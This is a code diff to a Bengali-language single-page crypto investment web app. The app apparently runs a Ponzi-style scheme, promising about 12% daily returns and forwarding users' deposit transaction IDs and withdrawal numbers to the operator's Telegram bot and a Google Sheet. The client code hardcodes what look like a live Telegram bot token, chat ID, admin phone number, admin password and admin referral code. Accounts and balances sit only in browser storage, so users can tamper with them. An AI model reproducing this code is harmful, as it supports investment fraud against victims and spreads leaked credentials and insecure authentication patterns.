@@ -283,7 +283,7 @@ const STORAGE = 'crypto_invest_v3';
 const ADMIN_PHONE = '01797025790';
 const TG_BOT_TOKEN = '8725434647:AAGdS27pf-aVSO2Pd8ZHEG_RY988Y1ZKyuVM';
 const TG_CHAT_ID = '6514948285';
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzXS6PisE3fY0d27IiwZZUBoMajjpjbyelXYECo6ISc98aPhBJ3bRBL-QpQVQMUCr22/exec";
+const WEB_APP_URL = "PASTE_YOUR_GOOGLE_URL_HERE"; // আপনার গুগল স্ক্রিপ্ট লিংক এখানে দিন
 
 let pageHistory = ['home'];
 
@@ -299,6 +299,20 @@ function showToast(msg) {
   t.classList.add('show'); setTimeout(() => { t.classList.remove('show'); }, 2500);
 }
 
+// টেলিগ্রাম নোটিশ পাঠানোর উন্নত ফাংশন
+function sendTelegramNotice(textMessage) {
+  const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(textMessage)}&parse_mode=HTML`;
+  fetch(url).catch(err => console.log("Telegram Error: ", err));
+}
+
+// গুগল শিটে ডেটা পাঠানোর ফাংশন
+function sendToGoogleSheet(data) {
+  if(WEB_APP_URL && WEB_APP_URL !== "PASTE_YOUR_GOOGLE_URL_HERE") {
+    const url = `${WEB_APP_URL}?` + new URLSearchParams(data).toString();
+    fetch(url, { mode: 'no-cors' }).catch(e => console.log("Google Sheet Error: ", e));
+  }
+}
+
 const PLANS = [
   {id:'Bitcoin (BTC)', min:1000, daily:120, img:'https://assets.coingecko.com/coins/images/1/large/bitcoin.png'},
   {id:'Ethereum (ETH)', min:2000, daily:280, img:'https://assets.coingecko.com/coins/images/279/large/ethereum.png'},
@@ -308,7 +322,6 @@ const PLANS = [
   {id:'Ripple (XRP)', min:7000, daily:900, img:'https://i.postimg.co/d0Y8M6yX/ripple-xrp.png'}
 ];
 
-// বুটস্ট্র্যাপে অ্যাডমিন অ্যাকাউন্ট, পাসওয়ার্ড এবং সিকিউর রেফার আইডি স্থায়ী করা হলো
 (function bootstrap(){
   const users = loadAll();
   if(!users[ADMIN_PHONE] || users[ADMIN_PHONE].password !== '721059' || !users[ADMIN_PHONE].myRefId){
@@ -410,14 +423,12 @@ $('authPrimary').addEventListener('click', ()=>{
   if(authMode === 'signup'){
     if(users[phone]) return showToast('এই নাম্বারে অলরেডি অ্যাকাউন্ট আছে!');
     
-    // প্রতি ইউজারের জন্য আলাদা গোপন রেফার আইডি তৈরি (নাম্বার হাইড)
     const randomRefId = 'cr_' + Math.random().toString(36).substring(2, 10);
     users[phone] = { phone, password:pass, balance:0, activePlans:[], referrals:[], refEarn:0, deposits:[], withdrawals:[], referrer:null, myRefId: randomRefId };
     
     const urlParams = new URLSearchParams(window.location.search);
     const refParam = urlParams.get('ref');
     if(refParam){
-      // গোপন রেফার আইডি দিয়ে মেইন আপলাইন ইউজারকে সনাক্তকরণ
       const referrerUser = Object.values(users).find(u => u.myRefId === refParam || (u.phone === ADMIN_PHONE && refParam === 'cr_admin72'));
       if(referrerUser){
         users[phone].referrer = referrerUser.phone;
@@ -490,14 +501,6 @@ function openDeposit(planId, min){
   showPage('deposit');
 }
 
-function sendTelegramNotice(textMessage) {
-  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: textMessage, parse_mode: 'HTML' })
-  }).catch(err => console.log("Telegram Error: ", err));
-}
-
 function submitDeposit(){
   const plan = $('depositPlan').value; const amount = Number($('depositAmount').value); const tx = $('depositTx').value.trim();
   if(!tx) return showToast('Transaction ID দিন!');
@@ -511,6 +514,7 @@ function submitDeposit(){
   
   const tgMsg = `📥 <b>নতুন ডিপোজিট রিকোয়েস্ট এসেছে!</b>\n\n👤 ইউজার আইডি: <code>${cur}</code>\n📦 ইনভেস্ট প্ল্যান: <b>${plan}</b>\n💰 পরিমাণ: <b>${amount} ৳</b>\n⛓️ TxID: <code>${tx}</code>\n⏰ সময় ও তারিখ: <i>${dateTimeStr}</i>\n\n👉 দ্রুত আপনার বিকাশ অ্যাকাউন্ট চেক করে রিকোয়েস্টটি এপ্রুভ করুন।`;
   sendTelegramNotice(tgMsg);
+  sendToGoogleSheet({type:'Deposit', phone:cur, amount:amount, tx:tx, plan:plan});
 
   showToast('ডিপোজিট সাবমিট হয়েছে! এডমিন ভেরিফাই করলে ব্যালেন্স ও প্যাক একটিভ হবে।');
   showPage('home');
@@ -557,12 +561,12 @@ function requestWithdraw(){
   
   const tgMsg = `💸 <b>নতুন টাকা উত্তোলনের (Withdraw) রিকোয়েস্ট!</b>\n\n👤 ইউজার আইডি: <code>${cur}</code>\n💰 পরিমাণ: <b>${amount} ৳</b>\n🏦 মেথড: <b>${method}</b>\n📱 রিসিভ নাম্বার: <code>${number}</code>\n⏰ সময়: <i>${dateTimeStr}</i>\n\n👉 ইউজারকে টাকা সেন্ড করে অ্যাডমিন প্যানেল থেকে এপ্রুভ করুন।`;
   sendTelegramNotice(tgMsg);
+  sendToGoogleSheet({type:'Withdraw', phone:cur, amount:amount, method:method, number:number});
 
   showToast('উইথড্র রিকোয়েস্ট সফলভাবে পেন্ডিং লিস্টে গেছে।');
   showPage('withdrawHistory');
 }
 
-// পাসওয়ার্ড পরিবর্তনের স্বাভাবিক নিয়ম (কোনো লক নেই)
 function changePassword() {
   const cur = getCurrent(); const users = loadAll(); const me = users[cur];
   const oldP = $('oldPass').value; const newP = $('newPass').value; const confP = $('confPass').value;
@@ -576,11 +580,8 @@ function changePassword() {
   $('oldPass').value = ''; $('newPass').value = ''; $('confPass').value = '';
 }
 
-// মোবাইল নম্বর ছাড়া গোপন বা ইউনিক কোড দিয়ে রেফার লিংক তৈরির ফাংশন
 function renderRefLink(){
-  const cur = getCurrent();
-  const users = loadAll();
-  const me = users[cur];
+  const cur = getCurrent(); const users = loadAll(); const me = users[cur];
   if(!me.myRefId) {
     me.myRefId = cur === ADMIN_PHONE ? 'cr_admin72' : 'cr_' + Math.random().toString(36).substring(2, 10);
     users[cur] = me; saveAll(users);
@@ -706,5 +707,7 @@ $('copyRefBtn').addEventListener('click', ()=>{ navigator.clipboard.writeText($(
 function logout(){ clearCurrent(); window.location.reload(); }
 </script>
 </body>
+  </html>
                                                                                           </html>
                                                                                              </html>
+ 
